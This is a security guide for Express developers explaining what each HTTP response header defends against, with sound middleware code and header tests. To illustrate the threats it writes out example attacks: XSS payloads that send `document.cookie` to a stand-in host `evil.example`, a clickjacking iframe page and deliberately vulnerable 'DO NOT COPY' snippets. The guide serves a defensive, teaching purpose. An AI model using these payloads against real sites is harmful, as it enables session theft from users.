---
title: Security headers
description: What each response header actually defends against, what it does not, and how to prove yours are still present on the 500 your error handler sends.
status: current
updated: 2026-09-09
---

A response header is a request you make of the browser. It never blocks anything at your server, it does nothing at all for a non-browser client, and it only helps if the browser both understands the directive and receives it. That makes the whole subject narrower than a scanner grade suggests: a handful of these headers stop real attacks, several are legacy trivia, and for a JSON API most of them are inert.

This page is the threat model — what each header defends against, what it does not, and how to verify it. The Helmet *configuration* for all of it lives in [Security headers with Helmet](../express-libraries/security-headers-helmet.md); the examples here use `res.setHeader` so you can see the exact bytes, and so they apply whether you use Helmet, a proxy, or neither.

## What a header can and cannot do

| It does | It does not |
| --- | --- |
| Constrain what a **compliant browser** will do with your response | Constrain `curl`, a mobile app, a scraper, or a server-side client |
| Reduce the *impact* of an injection bug you already have | Prevent the injection |
| Stop a class of cross-origin abuse of your page | Stop an IDOR, a missing authorization check, or SQL injection |
| Apply to the response it was set on | Apply retroactively to a response already sent |

The last row is the one that bites in Express. Headers are per-response state, so a header set inside a route handler does not exist on the error response that handler triggers. That failure has its own section below because it is the most common way a correctly-configured application still ships bare responses.

## Content-Security-Policy

**What it defends against.** CSP is an allow-list for the sources a document may load and execute. Its one high-value job is making an injected `<script>` — or an injected `onerror=` attribute — fail to run.

**The exploit it mitigates.** Stored XSS in a comment field:

```bash
$ curl -s -X POST https://app.example.com/comments \
    -H "Authorization: Bearer $TOKEN" -H 'content-type: application/json' \
    -d '{"body":"<img src=x onerror=fetch(`https://evil.example/c?d=${document.cookie}`)>"}'
{"id":"c-8812"}
```

Every visitor who loads that thread ships their session cookie to `evil.example`. With no CSP, the browser has no reason to refuse.

### A realistic policy

Start from `default-src 'none'` and grant only what the page proves it needs. A policy that starts from `'self'` silently permits every fetch destination you forgot to think about.

```text
default-src 'none';
script-src 'self' 'nonce-{PER-RESPONSE-RANDOM}';
style-src 'self';
img-src 'self' data: https://cdn.example.com;
font-src 'self';
connect-src 'self' https://api.example.com;
form-action 'self';
frame-ancestors 'none';
base-uri 'none';
object-src 'none';
upgrade-insecure-requests
```

Three of those lines are load-bearing in ways that are easy to miss:

- **`base-uri 'none'`** — without it, an injected `<base href="https://evil.example/">` rewrites every relative script URL on the page, and your `script-src 'self'` allow-list resolves against the attacker's host.
- **`form-action 'self'`** — without it, an injected form can post the user's credentials or CSRF token to another origin. `connect-src` does not cover form submission.
- **`object-src 'none'`** — plugin content is a script-execution path that `script-src` does not cover.

`frame-ancestors 'none'` is the modern clickjacking control; see the framing section below.

### The nonce pattern

The nonce is how you allow *your* inline script without allowing the attacker's. Generate it per response, from a CSPRNG, and emit it both in the header and on the tag.

```js good title="src/middleware/csp.js"
import crypto from 'node:crypto'

export function csp(req, res, next) {
  const nonce = crypto.randomBytes(16).toString('base64')
  res.locals.cspNonce = nonce

  res.setHeader(
    'Content-Security-Policy',
    [
      "default-src 'none'",
      `script-src 'self' 'nonce-${nonce}'`,
      "style-src 'self'",
      "img-src 'self' data:",
      "font-src 'self'",
      "connect-src 'self'",
      "form-action 'self'",
      "frame-ancestors 'none'",
      "base-uri 'none'",
      "object-src 'none'",
      'upgrade-insecure-requests',
    ].join('; '),
  )
  next()
}
```

```js good title="src/app.js"
import express from 'express'
import { csp } from './middleware/csp.js'

const app = express()

app.use(csp)          // before every route, so the header is also on 404s and 500s
app.use(routes)

export default app
```

In the template, `<script nonce="{{ cspNonce }}">`. Nothing else.

**Verify it.** With the policy in place, Chrome refuses the injected handler and reports a violation resembling:

```text
Refused to execute inline event handler because it violates the following
Content Security Policy directive: "script-src 'self' 'nonce-r4Xh…'".
Either the 'unsafe-inline' keyword, a hash, or a nonce is required to enable
inline execution.
```

The comment still renders. The exfiltration does not happen. That is the whole value proposition: CSP does not fix the injection, it caps the blast radius.

### Why `'unsafe-inline'` defeats the whole thing

An XSS payload *is* inline script. `script-src 'self' 'unsafe-inline'` tells the browser to run any script the attacker manages to write into your HTML, which is precisely the attack the directive exists to stop.

:::danger
```js vulnerable title="DO NOT COPY"
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' 'unsafe-inline'",
)
```
:::

The `onerror` payload above executes against this policy exactly as it does against no policy at all. The header is still there, the scanner still gives you a pass, and the vulnerability is unchanged.

Two related traps:

- **A fixed nonce.** A nonce reused across responses is guessable by anyone who has ever loaded the page, which makes it `'unsafe-inline'` with extra steps. Generate it per response.
- **A CDN in `script-src`.** If the allow-listed host also serves arbitrary user content, a JSONP endpoint, or an old copy of a framework with a known gadget, the attacker loads their payload *from an allowed origin*. `'strict-dynamic'` addresses this: when present, host allow-lists in `script-src` are ignored and only nonce- or hash-approved scripts (plus what those scripts load) may execute.

:::note
When a nonce or hash is present in `script-src`, browsers ignore `'unsafe-inline'` in that same directive — it exists as a fallback for very old clients. That is not a reason to include it: a typo in the nonce name, a directive that fails to render, or a copy of the policy without the nonce, and `'unsafe-inline'` is suddenly live.
:::

### Rolling it out

`Content-Security-Policy-Report-Only` makes the browser report violations without blocking. Ship that first, collect for a week, then enforce. Use `report-uri` for coverage everywhere and `report-to` with a `Reporting-Endpoints` header for newer browsers; keep both while you are migrating.

Budget for the volume. Browser extensions inject scripts into your pages, so a public site's report endpoint receives a large amount of noise that has nothing to do with your code. Filter by directive and by whether the blocked URI is one of yours before you draw conclusions.

## Strict-Transport-Security

**What it defends against.** The window before your HTTP→HTTPS redirect happens. A user typing `app.example.com`, or clicking an old `http://` link, makes one request in the clear. An attacker on that network answers it themselves, and the redirect never arrives.

**The exploit.**

```bash
$ curl -sI http://app.example.com/dashboard
HTTP/1.1 301 Moved Permanently
Location: https://app.example.com/dashboard
```

That redirect is advice, delivered over a channel the attacker controls. They serve a plaintext copy of your login page instead, harvest the credentials, and proxy the session upstream over real TLS. The user sees a working site.

**The fix.** HSTS tells the browser to convert `http://` to `https://` for this host *before* it makes the request, for `max-age` seconds.

```js good title="src/middleware/hsts.js"
export function hsts(req, res, next) {
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains')
  next()
}
```

**What it does not do.** It does nothing on the very first visit from a browser that has never seen your site, because the browser has no policy yet. It is ignored entirely when received over plain HTTP — by design, so a network attacker cannot pin a policy for a host they do not own. And it is per-host: a policy for `app.example.com` says nothing about `api.example.com` unless `includeSubDomains` is present on a policy served by the parent domain.

### The real risk of `preload`

The preload list closes the first-visit gap by shipping your domain inside browser binaries. The cost is that you have handed control of an operational switch to a release train you do not run.

| | `max-age` only | `includeSubDomains` | `preload` |
| --- | --- | --- | --- |
| Who caches the rule | each browser that visited | each browser that visited | every browser, from install |
| Undo by removing the header | after `max-age` expires | after `max-age` expires | **no** |
| Undo properly | shorten `max-age`, wait | shorten `max-age`, wait | request removal, wait for browser releases — months |
| Breaks if a subdomain is HTTP-only | no | **yes, immediately** | **yes, and unfixably** |

Submission to the preload list requires a `max-age` of at least one year, `includeSubDomains`, and the `preload` token, plus HTTPS on the apex and a redirect from HTTP on the same host. Once you satisfy those and submit, `legacy-printer.example.com` on plain HTTP stops working for every user, and removing the header does not bring it back.

:::warning
Ship `max-age=300` first. Confirm every subdomain — including the ones owned by other teams, the ones on a vendor's infrastructure, and the ones nobody has touched in three years — serves HTTPS. Then raise to a year. Add `preload` only when you are prepared to keep that promise for the life of the domain.
:::

## X-Content-Type-Options: nosniff

**What it defends against.** Browsers guessing a response's type from its bytes instead of believing your `Content-Type`, and executing user-uploaded content as script.

**The exploit.** Upload a text file whose contents are JavaScript:

```bash
$ cat payload.txt
fetch('https://evil.example/c?d=' + document.cookie)

$ curl -s -X POST https://api.example.com/uploads \
    -H "Authorization: Bearer $TOKEN" -F 'file=@payload.txt;type=text/plain'
{"id":"a91","url":"/uploads/a91/payload.txt"}

$ curl -sI https://api.example.com/uploads/a91/payload.txt
HTTP/2 200
content-type: text/plain; charset=utf-8
```

Now load it as a script from a page on your own origin — which your `script-src 'self'` policy permits, because it *is* self:

```html
<script src="https://api.example.com/uploads/a91/payload.txt"></script>
```

Without `nosniff`, the browser executes it. The upload endpoint just became a script-hosting service inside your own CSP allow-list.

**The fix.**

```js good title="src/middleware/headers.js"
export function baseHeaders(req, res, next) {
  res.setHeader('X-Content-Type-Options', 'nosniff')
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
  res.setHeader('Cross-Origin-Resource-Policy', 'same-origin')
  res.setHeader(
    'Permissions-Policy',
    'accelerometer=(), camera=(), display-capture=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()',
  )
  next()
}
```

The other three are covered in their own sections below; they live here because a single middleware registered once, before the routes, is what keeps them on every response.

With `nosniff`, Chrome refuses:

```text
Refused to execute script from 'https://api.example.com/uploads/a91/payload.txt'
because its MIME type ('text/plain') is not executable, and strict MIME type
checking is enabled.
```

**What it does not do.** It does not make user uploads safe. A file served as `text/html` is still HTML, and `nosniff` will happily honor that. Serve user content from a separate origin, force `Content-Disposition: attachment`, and pick the `Content-Type` yourself rather than echoing the client's — see [File upload security](file-upload-security.md).

This is the cheapest header on the page and there is no configuration to get wrong. Keep it everywhere.

## X-Frame-Options vs CSP frame-ancestors

**What they defend against.** Clickjacking: your real page, in an invisible iframe, over the attacker's bait.

**The exploit.** The attacker's page, served from anywhere:

```html
<style>
  #bait { position: absolute; top: 210px; left: 140px; z-index: 1 }
  iframe { position: absolute; top: 0; left: 0; width: 900px; height: 700px;
           opacity: 0.0001; z-index: 2; border: 0 }
</style>
<button id="bait">Claim your free trial</button>
<iframe src="https://app.example.com/settings/delete-account"></iframe>
```

The user clicks the button. The click lands on your **Delete account** button, inside a session they are already logged into. No CSRF token is bypassed, because the browser sent a real, user-initiated click.

**The fix.** Two headers do the same job. Set both.

`frame-ancestors 'none'` is already in the CSP built above. Add the legacy header alongside it:

```js good title="src/middleware/headers.js"
export function framingHeaders(req, res, next) {
  res.setHeader('X-Frame-Options', 'DENY')
  next()
}
```

Resist the temptation to send a second `Content-Security-Policy` header carrying only `frame-ancestors`. Multiple CSP headers are each enforced independently and the effective policy is their intersection — never a merge — so a second header narrows things in ways that are hard to reason about. Keep every directive in one policy.

| | `X-Frame-Options` | CSP `frame-ancestors` |
| --- | --- | --- |
| Values | `DENY`, `SAMEORIGIN` | any source list: `'none'`, `'self'`, `https://partner.example` |
| Multiple allowed embedders | no | yes |
| Wins where both are understood | no | **yes** |
| Understood by very old clients | yes | no |

`X-Frame-Options: ALLOW-FROM` was never widely implemented; if you need to allow a specific embedder, the answer is `frame-ancestors https://partner.example` and nothing else.

**What they do not do.** Neither header protects a JSON response, because there is nothing to click in a framed JSON document. Both are for pages. And neither is a substitute for confirming destructive actions — a re-authentication prompt or a typed confirmation defeats clickjacking regardless of headers.

## Referrer-Policy

**What it defends against.** Your URLs being handed to every third party your page talks to.

**The exploit.** A user opens a password-reset link. The page loads an analytics script. The analytics origin receives:

```text
GET /collect?v=2 HTTP/1.1
Host: analytics.example.net
Referer: https://app.example.com/reset?token=8f2a1c94b7e0d3
```

The reset token is now in a third party's logs, and in the logs of anything between. The same applies to document IDs, invite codes, search queries, and any identifier you put in a path.

**The fix.**

```js good
res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin')
```

| Policy | Same-origin | Cross-origin HTTPS | HTTPS → HTTP |
| --- | --- | --- | --- |
| `no-referrer` | nothing | nothing | nothing |
| `same-origin` | full URL | nothing | nothing |
| `strict-origin` | origin | origin | nothing |
| `strict-origin-when-cross-origin` | full URL | origin | nothing |
| `unsafe-url` | full URL | full URL | full URL |

`strict-origin-when-cross-origin` is the modern browser default and the usual right answer: you keep useful same-origin referrers and your paths never leave the origin. `no-referrer` is stricter and breaks referral analytics plus some OAuth implementations that inspect the referrer.

**What it does not do.** It is a browser courtesy, not a control. It does nothing about the token sitting in your own access logs, your proxy's logs, or the user's browser history. The actual fix for a secret in a URL is to stop putting secrets in URLs — see [Logging without leaking PII](logging-without-leaking-pii.md).

## Permissions-Policy

**What it defends against.** Code running on your origin — yours, a third-party script's, or an injected one's — prompting for camera, microphone, or geolocation, and embedded iframes inheriting those capabilities.

```js good
res.setHeader(
  'Permissions-Policy',
  'accelerometer=(), camera=(), display-capture=(), geolocation=(), gyroscope=(), magnetometer=(), microphone=(), payment=(), usb=()',
)
```

The syntax is `feature=(allowlist)`. An empty list `()` denies the feature to everyone including your own page; `(self)` allows your origin only; `(self "https://partner.example")` adds a specific embedded origin. Turn a feature back on only where you use it, and prefer scoping it to the one route that needs it.

**What it does not do.** Unknown feature names are silently ignored, browser support varies by feature, and none of it stops a script that never needed a permission in the first place — exfiltrating the DOM requires no permission at all. Treat it as defense in depth that costs one header, not as a control you rely on.

For a JSON API it is pointless: there is no document, so there is no permission to delegate.

## The cross-origin trio: CORP, COOP, COEP

| Header | Controls | Set it when |
| --- | --- | --- |
| `Cross-Origin-Resource-Policy` | who may embed **your response** as a no-CORS subresource (`<img>`, `<script>`, `<link>`, font) | always — `same-origin` unless another origin legitimately loads your assets |
| `Cross-Origin-Opener-Policy` | whether a window you open, or that opened you, shares a browsing-context group | your pages are opened from, or open, untrusted origins |
| `Cross-Origin-Embedder-Policy` | whether **you** may embed cross-origin resources that have not opted in | you need cross-origin isolation, and only then |

**CORP.** `Cross-Origin-Resource-Policy: same-origin` is what stops another site from pulling your endpoint in with `<script src>` or `<img src>` and measuring the result. The information leaked that way is coarse — load success or failure, timing, sometimes size — but that is enough for cross-site search and existence oracles.

```js good
res.setHeader('Cross-Origin-Resource-Policy', 'same-origin')
```

The failure mode catches people out: if a different origin genuinely loads your images or fonts, they break, and the console error looks nothing like CORS. Set `cross-origin` on those specific routes, not globally.

**COOP.** `Cross-Origin-Opener-Policy: same-origin` severs `window.opener`, so a page you opened cannot navigate you to a phishing copy of your own login screen, and cannot probe your window for frame counts or navigation state.

```js good
res.setHeader('Cross-Origin-Opener-Policy', 'same-origin')
```

This breaks OAuth and payment flows built on a popup that calls back into `window.opener`. Use `same-origin-allow-popups` on the page that opens such a popup.

**COEP.** `require-corp` blocks every cross-origin subresource that has not explicitly opted in via CORP or CORS. Turning it on breaks third-party images, fonts, embeds, and analytics until each one is fixed. The only reason to accept that cost is cross-origin isolation, which is the prerequisite for `SharedArrayBuffer` and unthrottled high-resolution timers. If you do not need those, do not set it.

## Cache-Control on authenticated responses

**What it defends against.** Someone else's copy of a personal response — from a shared cache, a CDN, a corporate proxy, or the disk of a shared machine.

**The exploit.** A profile endpoint that looks harmlessly conservative:

```bash
$ curl -sI https://api.example.com/me -H "Authorization: Bearer $ALICE"
HTTP/2 200
cache-control: private, max-age=600
content-type: application/json
```

The CDN in front of it is configured to cache 200s and its cache key is method plus URL. `Authorization` is not in the key, and `private` is a directive for shared caches to respect — one misconfigured tier and it is not respected. Bob asks for the same URL:

```bash
$ curl -s https://api.example.com/me -H "Authorization: Bearer $BOB" -D - -o body.json
HTTP/2 200
age: 41
$ cat body.json
{"id":1,"email":"alice@example.com","role":"admin"}
```

`age: 41` is the tell: nothing generated that response, a cache replayed it.

**The fix.** Authenticated responses are `no-store`, and you declare what varies so no cache can key on the URL alone.

```js good title="src/middleware/no-store.js"
export function noStore(req, res, next) {
  res.setHeader('Cache-Control', 'no-store')
  res.vary('Authorization')
  res.vary('Cookie')
  next()
}
```

```js good title="src/app.js"
app.use('/api', authenticate, noStore, apiRoutes)
```

Two distinctions worth having straight:

- **`no-store` is not `no-cache`.** `no-cache` permits storage and requires revalidation before reuse; the response still sits on disk. `no-store` forbids storing it at all. For anything containing a token, a session, or personal data, you want `no-store`.
- **`private` is advice to shared caches.** It relies on every intermediary implementing it correctly. `no-store` does not.

:::warning
Express 5's `res.vary()` throws when the field argument is missing, so `res.vary()` with no argument is an error, not a no-op. Pass the field name.
:::

On logout, `Clear-Site-Data: "cache", "cookies", "storage"` asks the browser to drop what it holds for your origin. Support is not universal, so treat it as a bonus on top of actually invalidating the session server-side, never as the mechanism.

## Headers must survive the error path

This is the failure that survives every audit, because the headers are correct on every response the auditor looked at.

**The threat.** A header set inside a route handler exists only if that handler reaches the line that sets it. Anything that throws first — and in Express 5, a rejected promise from an `async` handler reaches your error middleware automatically — produces a response built by a different function, with none of the handler's headers.

:::danger
```js vulnerable title="DO NOT COPY — src/routes/me.js"
app.get('/me', authenticate, async (req, res) => {
  res.setHeader('Cache-Control', 'no-store')      // only runs if nothing above throws
  res.vary('Authorization')

  const user = await users.findById(req.user.id)  // rejects → straight to the error handler
  res.json(publicUser(user))
})
```
:::

**The exploit is a database blip.** Compare the two responses:

```bash
$ curl -sD - -o /dev/null https://api.example.com/me -H "Authorization: Bearer $T"
HTTP/2 200
cache-control: no-store
vary: Authorization

$ curl -sD - -o /dev/null https://api.example.com/me -H "Authorization: Bearer $T"
HTTP/2 500
content-type: application/json; charset=utf-8
```

The 500 has no `Cache-Control` and no `Vary`. If a cache in front of you stores 500s — many do, briefly, to shed load — it now holds an uncacheable-by-intent response keyed on a URL alone. The same applies to every header in this page: a CSP set per-route is missing from the 404 that renders an HTML error page.

**The fix.** Set headers in middleware registered before your routes, so they are already on `res` no matter which function ends up writing the body.

```js good title="src/app.js"
import express from 'express'
import { baseHeaders, framingHeaders, hsts } from './middleware/headers.js'
import { csp } from './middleware/csp.js'
import { noStore } from './middleware/no-store.js'
import { errorHandler } from './middleware/errors.js'

const app = express()

app.disable('x-powered-by')

app.use(baseHeaders)     // nosniff, Referrer-Policy, Permissions-Policy, CORP
app.use(framingHeaders)  // X-Frame-Options + frame-ancestors
app.use(hsts)
app.use(csp)

app.use('/api', authenticate, noStore, apiRoutes)

app.use(errorHandler)    // last

export default app
```

The error handler itself must not try to add headers after the response has started:

```js good title="src/middleware/errors.js"
export function errorHandler(err, req, res, next) {
  if (res.headersSent) return next(err)   // let Express close the connection

  req.log.error({ err }, 'unhandled error')
  res.status(err.status ?? 500).json({ error: 'internal_error' })
}
```

Once `res.headersSent` is true, `res.setHeader` throws `ERR_HTTP_HEADERS_SENT` and you turn a 500 into a crash. Delegating to `next(err)` hands it to Express's default handler, which destroys the socket — ugly, but correct.

## Which of these matter for a JSON API

Be honest about this. Most of the list is for documents, and a JSON API has none.

| Header | JSON-only API | Why |
| --- | --- | --- |
| `Strict-Transport-Security` | **Yes** | Browsers honor it for `fetch`/XHR origins; it closes the plaintext first-request window |
| `X-Content-Type-Options` | **Yes** | The moment any route returns a user-supplied file, this is what stops it executing |
| `Cross-Origin-Resource-Policy` | **Yes** | Stops another origin including your endpoint as a no-CORS subresource |
| `Cache-Control: no-store` | **Yes** | The highest-value header on an authenticated API, and the one most often missing |
| `Content-Security-Policy` | Keep a strict one | Inert for JSON, but it is your safety net the day a route returns HTML: an error page, a redirect body, a docs UI |
| `Referrer-Policy` | Marginal | Matters for any URL a browser navigates to, not for XHR responses |
| `X-Frame-Options` / `frame-ancestors` | No | A JSON document cannot be usefully framed |
| `Permissions-Policy` | No | No document, no permissions to delegate |
| `Cross-Origin-Opener-Policy` | No | No browsing context |
| `Cross-Origin-Embedder-Policy` | No | You are not embedding anything |
| `X-DNS-Prefetch-Control`, `X-Download-Options`, `X-Permitted-Cross-Domain-Policies` | No | Legacy-client trivia; harmless, and worth nothing |
| `X-XSS-Protection` | Set `0` | The legacy auditor was itself exploitable and is gone from current browsers |

The inverse belief is the dangerous one: that a full set of headers secures an API. Not one header on this page touches authentication, authorization, injection, or rate limiting.

## Verifying

Check the happy path, a 404, and a 500 — separately, because they are produced by different code.

```bash
$ curl -sI https://api.example.com/health
$ curl -sD - -o /dev/null https://api.example.com/does-not-exist
$ curl -sD - -o /dev/null https://api.example.com/boom
```

`curl -I` sends a `HEAD`. A route registered only for `GET` answers 404 to that, so use `-sD - -o /dev/null` when you need the headers of a real `GET`.

To see just the security headers:

```bash
$ curl -sD - -o /dev/null https://api.example.com/me -H "Authorization: Bearer $T" \
  | grep -i -E 'content-security|strict-transport|x-frame|x-content-type|referrer|permissions|cross-origin|cache-control|vary'
```

Then make it a test, so the error path cannot regress quietly:

```js title="test/headers.test.js"
import { test } from 'node:test'
import assert from 'node:assert/strict'
import request from 'supertest'
import app from '../src/app.js'

const REQUIRED = {
  'strict-transport-security': /max-age=\d+/,
  'x-content-type-options': /^nosniff$/,
  'referrer-policy': /strict-origin-when-cross-origin/,
  'content-security-policy': /default-src/,
}

for (const [path, status] of [['/health', 200], ['/nope', 404], ['/boom', 500]]) {
  test(`security headers survive a ${status}`, async () => {
    const res = await request(app).get(path)
    assert.equal(res.status, status)
    for (const [header, pattern] of Object.entries(REQUIRED)) {
      assert.match(res.headers[header] ?? '', pattern, `${header} missing on ${status}`)
    }
  })
}

test('authenticated responses are not storable', async () => {
  const res = await request(app).get('/api/me').set('Authorization', `Bearer ${token}`)
  assert.match(res.headers['cache-control'] ?? '', /no-store/)
  assert.match(res.headers['vary'] ?? '', /Authorization/i)
})
```

Run with `node --test`. Add a `/boom` route in the test environment only — a route that throws is the only way to assert the error path.

Finally, verify at the edge, not at Node. A CDN or ingress that adds its own copy of a header produces duplicates, and a browser's handling of two conflicting CSP headers is to enforce *both*, which usually means enforcing the stricter one and breaking your page.

## Security considerations

- **A header constrains the browser, never the attacker's client.** Every control here is worthless against `curl`, and worthless against a server-side attacker.
- **CSP mitigates, it does not prevent.** Fix the injection; the policy is what limits the damage while you do.
- **One `'unsafe-inline'` makes the policy decorative.** So does a fixed nonce, a wildcard host, or an allow-listed CDN that serves user content.
- **`preload` is a one-way door.** Everything else on this page can be rolled back with a deploy.
- **Headers set in a route handler are missing from every response that handler did not write.** Set them in middleware, before the routes.
- **A header scanner grades bytes, not behavior.** An A+ says nothing about whether `/users/:id` checks ownership.
- **Pick one owner per header.** Node or the edge, never both, or you ship duplicates and nobody can tell which one is in force.

## Production considerations

- **Roll CSP out report-only, and budget for the report volume.** Browser extensions generate a large share of violations on public sites; filter to your own origins before you act on the data.
- **Stage HSTS.** `max-age=300`, verify every subdomain, then a year, then consider `preload` — and write down who owns the decision.
- **Gate `upgrade-insecure-requests` and HSTS out of development.** Both fight with `http://localhost`, and a browser that has cached your dev HSTS policy will refuse plain HTTP for the whole `max-age`.
- **Diff the headers your CDN emits against the ones Node emits.** Duplicates and silent overrides both show up only in the real response.
- **Headers cost bytes on every response.** A full CSP is several hundred; on a high-volume API that is measurable. Shorten by removing directives you do not need, never by dropping CSP.
- **Scope loose policies to a path.** A docs UI that needs inline styles gets its own CSP on its own route, not a site-wide relaxation — see [API documentation](../express-libraries/api-documentation.md).
- **Monitor for the headers disappearing.** A synthetic check that fetches one authenticated URL and asserts `Cache-Control: no-store` catches the refactor that moved the middleware below the routes.

## Common mistakes

- **Setting headers inside route handlers.** They are absent from every 404, 500, and short-circuit response.
- **Registering the header middleware after the routes.** Same outcome, one line earlier.
- **`'unsafe-inline'` added to make the app work.** That is the vulnerability, restored deliberately.
- **A nonce generated once at startup.** Constant across responses, therefore known, therefore useless.
- **`default-src 'self'` treated as a finished policy.** It permits every fetch, frame, and form target you never considered; start from `'none'`.
- **Omitting `base-uri` and `form-action`.** `script-src` does not cover either, and both are complete bypasses.
- **`includeSubDomains; preload` with a one-year `max-age` on day one.** Unrecoverable from the server side.
- **`Cache-Control: private` on authenticated responses.** Advice to shared caches, and it still permits storage. Use `no-store`.
- **Forgetting `Vary` on responses that differ by `Authorization` or `Cookie`.** A cache keyed on the URL alone will serve one user's data to another.
- **Trusting `curl -I` for a GET-only route.** `HEAD` may take a different path and return a 404 whose headers prove nothing.
- **Two sources setting the same header.** Duplicate CSP headers are both enforced; duplicate HSTS is undefined behavior in practice.
- **`X-XSS-Protection: 1; mode=block` because a scanner flagged the `0`.** The `0` is deliberate.
- **Believing headers are the security work.** They are the cheapest 5% of it.

## Related topics

- [Security headers with Helmet](../express-libraries/security-headers-helmet.md) — the configuration side: what `helmet()` sets by default and how to narrow it.
- [Cross-site scripting (XSS)](xss.md) — the injection CSP mitigates, and why fixing the injection still comes first.
- [HTTPS and TLS](https-and-tls.md) — what has to be true before HSTS is safe to turn on.
- [CORS misconfiguration](cors-misconfiguration.md) — the other header-driven browser policy, and the one this gets confused with.
- [File upload security](file-upload-security.md) — why `nosniff` alone does not make user-supplied files safe.
- [Logging without leaking PII](logging-without-leaking-pii.md) — the server-side half of the `Referer` problem.
- [Middleware](../express/middleware.md) — why registration order decides which responses carry your headers.
- [Error handling](../express/error-handling.md) — where the response with no headers gets built.
